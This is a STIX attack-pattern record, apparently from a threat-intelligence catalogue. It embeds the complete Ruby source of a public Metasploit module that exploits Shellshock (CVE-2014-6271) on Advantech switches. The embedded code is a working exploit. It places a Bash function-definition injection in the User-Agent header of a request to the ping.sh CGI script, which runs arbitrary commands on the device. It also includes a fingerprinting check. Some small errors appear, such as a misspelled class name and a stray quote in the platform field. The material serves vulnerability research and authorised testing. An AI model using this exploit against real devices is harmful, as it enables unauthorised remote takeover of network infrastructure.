{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--72527229-c611-4f1e-bb94-4211934f4412",
    "created": "2024-08-14T17:02:57.431641Z",
    "modified": "2024-08-14T17:02:57.431645Z",
    "name": "Advantech Switch Bash Environment Variable Code Injection (Shellshock)",
    "description": " This module exploits the Shellshock vulnerability, a flaw in how the Bash shell handles external environment variables. This module targets the 'ping.sh' CGI script, accessible through the Boa web server on Advantech switches. This module was tested against firmware version 1322_D1.98. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/advantech_switch_bash_env_exec.rb",
            "external_id": "advantech_switch_bash_env_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-6271"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2015/12/01/r7-2015-25-advantech-eki-multiple-known-vulnerabilities"
        },
        {
            "source_name": "reference",
            "url": "https://access.redhat.com/articles/1200223"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/oss-sec/2014/q3/649"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'Advantech Switch Bash Environment Variable Code Injection (Shellshock)',\n      'Description' => %q{\n        This module exploits the Shellshock vulnerability, a flaw in how the Bash shell\n        handles external environment variables. This module targets the 'ping.sh' CGI\n        script, accessible through the Boa web server on Advantech switches. This module\n        was tested against firmware version 1322_D1.98.\n      },\n      'Author' => 'hdm',\n      'References' => [\n        [ 'CVE', '2014-6271' ],\n        [ 'CWE', '94' ],\n        [ 'OSVDB', '112004' ],\n        [ 'EDB', '34765' ],\n        [ 'URL', 'https://www.rapid7.com/blog/post/2015/12/01/r7-2015-25-advantech-eki-multiple-known-vulnerabilities' ],\n        [ 'URL', 'https://access.redhat.com/articles/1200223' ],\n        [ 'URL', 'https://seclists.org/oss-sec/2014/q3/649' ]\n      ],\n      'Privileged' => false,\n      'Arch' => ARCH_CMD,\n      'Platform' => 'unix',\n      'Payload' =>\n        {\n          'Space' => 1024,\n          'BadChars' => \"\\x00\\x0A\\x0D\",\n          'DisableNops' => true,\n          'Compat' =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'openssl generic'\n            }\n        },\n      'Targets' =>  [[ 'Automatic Targeting', { 'auto' => true } ]],\n      'DefaultTarget' => 0,\n      'License' => MSF_LICENSE,\n      'DisclosureDate' => '2015-12-01',\n      'Notes' =>\n          {\n            'Stability' => [CRASH_SAFE],\n            'SideEffects' => [],\n            'Reliability' => [],\n            'AKA' => ['Shellshock']\n          }\n    ))\n    register_options([\n      Opt::RPORT(80)\n    ])\n  end\n\n  #\n  # CVE-2014-6271\n  #\n  def cve_2014_6271(cmd)\n    %{() { :;}; $(#{cmd}) & }\n  end\n\n  #\n  # Check credentials\n  #\n  def check\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri'    => '/cgi-bin/ping.sh'\n    )\n    if !res\n      vprint_error(\"No response from host\")\n      return Exploit::CheckCode::Unknown\n    elsif res.headers['Server'] =~ /Boa\\/(.*)/\n      vprint_status(\"Found Boa version #{$1}\")\n    else\n      print_status(\"Target is not a Boa web server\")\n      return Exploit::CheckCode::Safe\n    end\n\n    if res.body.to_s.index('127.0.0.1 ping statistics')\n      return  Exploit::CheckCode::Detected\n    else\n      vprint_error(\"Target does not appear to be an Advantech switch\")\n      return Expoit::CheckCode::Safe\n    end\n  end\n\n  #\n  # Exploit\n  #\n  def exploit\n    cmd = cve_2014_6271(payload.encoded)\n    vprint_status(\"Trying to run command '#{cmd}'\")\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri'    => '/cgi-bin/ping.sh',\n      'agent'  => cmd\n    )\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-12-01",
    "x_mitre_platforms": [
        "unix'"
    ]
}